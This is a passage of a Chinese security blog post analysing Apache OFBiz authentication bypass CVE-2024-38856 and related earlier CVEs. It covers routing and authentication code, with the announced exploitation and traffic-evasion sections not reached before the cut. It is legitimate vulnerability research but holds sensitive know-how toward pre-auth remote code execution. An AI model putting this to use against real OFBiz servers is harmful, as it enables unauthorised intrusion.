<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="写在前面​    自去年CVE-2023-51467爆出后，起初我是不太想再看这个系统了，但年初连续的三个权限绕过相关的CVE编号(CVE-2024-25065&#x2F;CVE-2024-32113&#x2F;CVE-2024-36104)又让我产生了好奇，随着对三个历史漏洞分析的过程中，我也发现这三个漏洞的影响面其实并没有特别严重，但思路值得学习(本质是低权限账号提权，利用前提是需要知道低权限账号的密码)，但随着"><meta property="og:type" content="article"><meta property="og:title" content="Apache OFBiz Authentication Bypass(CVE-2024-38856)"><meta property="og:url" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="写在前面​    自去年CVE-2023-51467爆出后，起初我是不太想再看这个系统了，但年初连续的三个权限绕过相关的CVE编号(CVE-2024-25065&#x2F;CVE-2024-32113&#x2F;CVE-2024-36104)又让我产生了好奇，随着对三个历史漏洞分析的过程中，我也发现这三个漏洞的影响面其实并没有特别严重，但思路值得学习(本质是低权限账号提权，利用前提是需要知道低权限账号的密码)，但随着"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623202154411.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623203146560.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623212746207.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623232919733.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624002738505.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004058286.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004152877.png"><meta property="og:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240624004600901.png"><meta property="article:published_time" content="2024-06-23T11:22:40.000Z"><meta property="article:modified_time" content="2024-08-05T14:50:18.000Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="Apache"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623202154411.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>Apache OFBiz Authentication Bypass(CVE-2024-38856)</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2024/06/30/year/2024/6/%E6%9F%90%E5%87%8COA%E4%B9%8B%E4%B8%80%E6%AC%A1%E5%90%8E%E5%8F%B0%E5%8F%98%E5%89%8D%E5%8F%B0%E7%9A%84%E6%95%85%E4%BA%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2024/06/05/year/2024/6/%E6%B5%85%E6%9E%90Panalog-SQL%E6%B3%A8%E5%85%A5%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Version-20240130/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&text=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&is_video=false&description=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Apache OFBiz Authentication Bypass(CVE-2024-38856)&body=Check out this article: https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&title=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&name=Apache OFBiz Authentication Bypass(CVE-2024-38856)&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/&t=Apache OFBiz Authentication Bypass(CVE-2024-38856)"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E4%B8%8E%E9%89%B4%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">路由与鉴权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E6%9E%90%E8%BF%9E%E7%BB%AD%E5%87%BA%E7%8E%B0%E4%B8%89%E6%AC%A1%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">浅析连续出现三次的权限绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-25065"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2024-25065</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">权限绕过浅析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E5%8F%8A%E4%B8%AA%E8%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BF%85%E9%A1%BB%E8%A6%81%E6%B1%82%E7%99%BB%E5%BD%95"><span class="toc-number">3.1.2.</span> <span class="toc-text">为什么这及个老漏洞利用必须要求登录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113-CVE-2024-36104"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2024-32113&#x2F;CVE-2024-36104</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-38856%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">CVE-2024-38856权限绕过浅析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">可利用的点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87%E7%9A%84%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">对抗流量设备的点</span></a></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">Apache OFBiz Authentication Bypass(CVE-2024-38856)</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2024-06-23T11:22:40.000Z" class="dt-published" itemprop="datePublished">2024-06-23</time> (Updated: <time datetime="2024-08-05T14:50:18.000Z" class="dt-updated" itemprop="dateModified">2024-08-05</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Apache/" rel="tag">Apache</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a></div></div></header><div class="content e-content" itemprop="articleBody"><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​ 自去年CVE-2023-51467爆出后，起初我是不太想再看这个系统了，但年初连续的三个权限绕过相关的CVE编号(CVE-2024-25065/CVE-2024-32113/CVE-2024-36104)又让我产生了好奇，随着对三个历史漏洞分析的过程中，我也发现这三个漏洞的影响面其实并没有特别严重，但思路值得学习(本质是低权限账号提权，利用前提是需要知道低权限账号的密码)，但随着进一步的深入分析，最终找到了一个新的利用方式，捡了一个前台RCE，在下文中，我将先对路由与鉴权做简单分析并穿插分析历史CVE的成因(CVE-2024-25065/CVE-2024-32113/CVE-2024-36104)，最后分享CVE-2024-38856的利用以及一些对抗流量设备的点</p><h2 id="路由与鉴权"><a href="#路由与鉴权" class="headerlink" title="路由与鉴权"></a>路由与鉴权</h2><p>(声明:以下仅介绍与漏洞相关必要代码)</p><p>Apache OFBiz的路由统一由<code>org.apache.ofbiz.webapp.control.ControlServlet</code>处理，在其<code>doGET/doPOST</code>方法中，首先用大量的代码完成了请求相关环境的初始化(字符集、日志以及上下文等)，其后对具体的请求处理逻辑则是通过RequestHandler处理</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623202154411.png" alt="image-20240623202154411"></p><p>可以看到在<code>org.apache.ofbiz.webapp.control.RequestHandler#doRequest</code>中</p><p>首先加载了配置信息，它会根据我们请求的上下文环境，解析配置文件<code>webapp/xxxxx/WEB-INF/controller.xml</code>，为方便讲解下文中的ControllerConfig统一用ccfg代替</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.ofbiz.webapp.control.RequestHandler</span></span><br><span class="line"><span class="comment">// Parse controller config.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ccfg = <span class="keyword">new</span> ControllerConfig(getControllerConfig());</span><br><span class="line">&#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">    Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ConfigXMLReader.<span class="function">ControllerConfig <span class="title">getControllerConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ConfigXMLReader.getControllerConfig(<span class="keyword">this</span>.controllerConfigURL);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">FIXME:</span> controller.xml errors should throw an exception.</span></span><br><span class="line">        Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里以<code>webapp/partymgr/WEB-INF/controller.xml</code>为例</p><p>简单看看这个配置文件，在前几行引入了一些通用的配置，另外在这里的注释中也提示我们如果存在<code>preprocessor/postprocessor</code>标签分别会执行预处理与后处理操作</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;component://common/webcommon/WEB-INF/common-controller.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;component://common/webcommon/WEB-INF/security-controller.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;component://commonext/webapp/WEB-INF/controller.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;component://content/webapp/content/WEB-INF/controller.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Party Manager Module Site Configuration File<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">name</span>=<span class="string">&quot;simplecontent&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.ofbiz.content.view.SimpleContentViewHandler&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Events to run on every request before security (chains exempt) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;preprocessor&gt;</span></span><br><span class="line"><span class="comment">&lt;/preprocessor&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Events to run on every request after all other processing (chains exempt) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;postprocessor&gt;</span></span><br><span class="line"><span class="comment">    &lt;event name=&quot;test&quot; type=&quot;java&quot; path=&quot;org.apache.ofbiz.webapp.event.TestEvent&quot; invoke=&quot;test&quot;/&gt;</span></span><br><span class="line"><span class="comment">&lt;/postprocessor&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>在此配置文件中剩余部分则以路由以及路由属性相关配置为主</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623203146560.png" alt="image-20240623203146560"></p><p>在下文分析时，我们以登录路由<code>/partymgr/control/login</code>为例</p><p>从下面的代码来看，首先会根据我们请求的路径从ccfg中尝试匹配并取得对应配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">String path = request.getPathInfo();</span><br><span class="line">String requestUri = getRequestUri(path);</span><br><span class="line">String overrideViewUri = getOverrideViewUri(path);</span><br><span class="line"></span><br><span class="line">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);</span><br><span class="line"><span class="keyword">if</span> (rmaps.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (throwRequestHandlerExceptionOnMissingLocalRequest) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(requestMissingErrorMessage);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerExceptionAllowExternalRequests();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String method = request.getMethod();</span><br><span class="line">RequestMap requestMap = resolveMethod(method, rmaps).orElseThrow(() -&gt; &#123;</span><br><span class="line">    String msg = UtilProperties.getMessage(<span class="string">&quot;WebappUiLabels&quot;</span>, <span class="string">&quot;RequestMethodNotMatchConfig&quot;</span>,</span><br><span class="line">            UtilMisc.toList(requestUri, method), UtilHttp.getLocale(request));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MethodNotAllowedException(msg);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>而我们的login则在一开始引入的通用配置<code>webcommon/WEB-INF/common-controller.xml</code>中</p><p>此配置文件开头先是定义了预处理与后处理相关事件操作，再往后看不难发现login相关配置，这里我们需要关注几个属性，security标签中的auth决定是否需要登录，event标签定义了如何处理事件，response标签定义返回类型</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">preprocessor</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Events to run on every request before security (chains exempt) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;check509CertLogin&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;check509CertLogin&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;checkRequestHeaderLogin&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;checkRequestHeaderLogin&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;checkServletRequestRemoteUserLogin&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;checkServletRequestRemoteUserLogin&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;checkExternalLoginKey&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.ExternalLoginKeysManager&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;checkExternalLoginKey&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;checkJWTLogin&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.JWTManager&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;checkJWTLogin&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;checkProtectedView&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.ProtectViewWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;checkProtectedView&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">name</span>=<span class="string">&quot;extensionConnectLogin&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;extensionConnectLogin&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">preprocessor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">postprocessor</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Events to run on every request after all other processing (chains exempt) --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">postprocessor</span>&gt;</span></span><br><span class="line"></span><br><span class="line">xxxx省略xxxx</span><br><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;requirePasswordChange&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;requirePasswordChange&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续回到我们的RequestHandler执行析，由于我们第一次进入不是链式请求(ControlServet中执行时定义了chain为null)，所以这里我们直接看else分支，跳过部分无关代码</p><p>首先会执行我们的预处理事件，这其中包含了证书校验、是否通过header登录、JWT登录、多身份视图权限等(漏洞无关，感兴趣可自行看代码)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chain != <span class="keyword">null</span>) &#123;</span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Invoke the pre-processor (but NOT in a chain)</span></span><br><span class="line">    <span class="keyword">for</span> (ConfigXMLReader.Event event: ccfg.getPreprocessorEventList().values()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String returnString = <span class="keyword">this</span>.runEvent(request, response, event, <span class="keyword">null</span>, <span class="string">&quot;preprocessor&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (returnString == <span class="keyword">null</span> || <span class="string">&quot;none&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                interruptRequest = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;success&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!returnString.contains(<span class="string">&quot;:_protect_:&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> EventHandlerException(<span class="string">&quot;Pre-Processor event [&quot;</span> + event.invoke + <span class="string">&quot;] did not return &#x27;success&#x27;.&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// protect the view normally rendered and redirect to error response view</span></span><br><span class="line">                    returnString = returnString.replace(<span class="string">&quot;:_protect_:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (returnString.length() &gt; <span class="number">0</span>) 